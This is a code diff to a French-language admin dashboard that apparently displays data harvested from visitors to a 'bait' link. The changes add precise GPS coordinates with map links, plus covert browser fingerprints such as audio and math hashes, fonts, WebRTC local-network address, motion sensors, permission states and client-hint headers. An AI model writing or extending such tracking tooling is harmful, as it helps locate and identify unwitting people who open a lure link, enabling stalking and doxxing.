@@ -32,6 +32,7 @@ tr.open{background:#1a2230}
 td.badge{font-size:11px;padding:3px 9px;border-radius:10px}
 .bg-ok{background:#1d3c2a;color:#7ed7a1}
 .bg-no{background:#3c2530;color:#d99ba6}
+.bg-src{background:#223a52;color:#8fb8de}
 #detail{background:#12161d;border:1px solid #243040;border-radius:12px;margin-top:14px;padding:20px;display:none}
 #detail h3{color:#7fa2c7;font-size:15px;margin:16px 0 8px;border-bottom:1px solid #232e3b;padding-bottom:6px}
 #detail h3:first-child{margin-top:0}
@@ -74,7 +75,7 @@ a.maps{color:#5ea9e6}
     <div class="tools">
       <input id="q" placeholder="Recherche IP / modèle..." oninput="render()">
       <button id="flush" onclick="flushAll()">Tout effacer</button>
-      <label class="auto"><input type="checkbox" id="auto" checked onchange="startAuto()"> auto 30s</label>
+      <label class="auto"><input type="checkbox" id="auto" checked onchange="startAuto()"> auto 60s</label>
     </div>
   </header>
 
@@ -159,10 +160,16 @@ function devTxt(s){
   return m.length>34?m.slice(0,34)+'…':m;
 }
 function precS(s){
-  const g=s.geo||{};
-  if(g&&!g.err&&g.lat!==null&&g.lat!==undefined&&g.lat!=='')return '<span class="badge bg-ok">approx. IP</span>';
-  if(g&&!g.err)return '<span class="badge bg-no">région IP</span>';
-  return '<span class="badge bg-no">—</span>';
+  const out=[];
+  if(s.src==='carte')out.push('<span class="badge bg-src">carte</span>');
+  if(s.glat!=null&&s.glon!=null){
+    out.push('<span class="badge bg-ok">GPS'+(s.gacc!=null?' ±'+Math.round(s.gacc)+'m':'')+'</span>');
+  }else if(s.geo&&!s.geo.err&&s.geo.lat!=null&&s.geo.lat!==''){
+    out.push('<span class="badge bg-no">approx. IP</span>');
+  }else{
+    out.push('<span class="badge bg-no">—</span>');
+  }
+  return out.join(' ');
 }
 function fmtT(t){try{const d=new Date(t);return d.toLocaleDateString('fr-FR')+' '+d.toLocaleTimeString('fr-FR')}catch(e){return t||'—'}}
 
@@ -198,6 +205,14 @@ function detailHtml(s){
     maps=`<a class="maps" target="_blank" href="https://maps.google.com/?q=${g.lat},${g.lon}">${g.lat}, ${g.lon}</a>`;
   }
   const prec=(g.lat!=null&&!g.err&&g.lat!=='')?'approx. via IP (lat/lon)':'approx. via IP (ville/région)';
+  let gpsHtml='';
+  if(s.glat!=null&&s.glon!=null){
+    gpsHtml='<h3>GPS précis (consenti)</h3><div class="kv">'+
+      fld('coords GPS','<a class="maps" target="_blank" href="https://maps.google.com/?q='+s.glat+','+s.glon+'">'+s.glat+', '+s.glon+'</a>')+
+      fld('rayon (m)',s.gacc)+'</div>';
+  }else if(s.gerr!=null){
+    gpsHtml='<h3>GPS</h3><div class="kv">'+fld('état',s.gerr===1?'refusé':'indisponible (code '+s.gerr+')')+'</div>';
+  }
   return `<td colspan="6" style="white-space:normal"><div id="detail" style="display:block">
     <h3>Localisation (${prec})</h3>
     <div class="kv">
@@ -210,6 +225,7 @@ function detailHtml(s){
       ${fld('org',g.org)}
       ${fld('asn',g.asn)}
     </div>
+    ${gpsHtml}
     <h3>Appareil</h3>
     <div class="kv">
       ${fld('modele (UA)',s.y)}
@@ -238,8 +254,45 @@ function detailHtml(s){
       ${fld('stockage (MB)',s.st)}
       ${fld('peripheriques media',s.q)}
     </div>
+    <h3>Empreintes & capacités</h3>
+    <div class="kv">
+      ${fld('audio fp',s.af)}
+      ${fld('math fp',s.mf)}
+      ${fld('polices',s.ft?s.ft+' — '+(s.ftl||''):'')}
+      ${fld('voix',s.vc?s.vc+' — '+(s.vl||''):'')}
+      ${fld('clavier',s.kl)}
+      ${fld('gamut',s.gm)}
+      ${fld('hdr',s.hdr)}
+      ${fld('thème sombre',s.dk)}
+      ${fld('animations réduites',s.rm)}
+      ${fld('pointeur',s.ptr)}
+      ${fld('mode affichage',s.dm)}
+      ${fld('codec h264',s.cv)}
+      ${fld('codec hevc',s.ch)}
+      ${fld('codec av1',s.ca)}
+      ${fld('codec opus',s.co)}
+      ${fld('mémoire js (MB)',s.pm)}
+      ${fld('rtt (ms)',s.rt)}
+      ${fld('data saver',s.sd)}
+    </div>
+    <h3>Comportement & entêtes</h3>
+    <div class="kv">
+      ${fld('type navigation',s.nt)}
+      ${fld('focus',s.fs)}
+      ${fld('durée page (s)',s.dw)}
+      ${fld('visibilité',s.vs)}
+      ${fld('mouvement (acc max)',s.mo)}
+      ${fld('réseau local (webrtc)',s.wl)}
+      ${fld('permissions',[[s.pno?'notif:'+s.pno:''],[s.pge?'geo:'+s.pge:''],[s.pca?'cam:'+s.pca:''],[s.pmi?'mic:'+s.pmi:'']].flat().filter(Boolean).join(' | '))}
+      ${fld('marques UA',(s.h&&s.h['sec-ch-ua'])||'')}
+      ${fld('plateforme UA-CH',(s.h&&s.h['sec-ch-ua-platform'])||'')}
+      ${fld('langues (entête)',(s.h&&s.h['accept-language'])||'')}
+      ${fld('région edge',(s.h&&s.h['x-vercel-id'])||'')}
+      ${fld('type de requête',(s.h&&s.h['sec-fetch-dest'])||'')}
+    </div>
     <h3>Réseau & session</h3>
     <div class="kv">
+      ${fld('page',s.src)}
       ${fld('connexion',s.k)}
       ${fld('downlink',s.dl)}
       ${fld('en ligne',s.n)}
@@ -317,7 +370,7 @@ async function resetBait(){
 let timer=null;
 function startAuto(){
   if(timer)clearInterval(timer);
-  if(document.getElementById('auto').checked){timer=setInterval(load,30000)}
+  if(document.getElementById('auto').checked){timer=setInterval(function(){if(!document.hidden)load()},60000)}
 }
 document.getElementById('pass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
 </script>
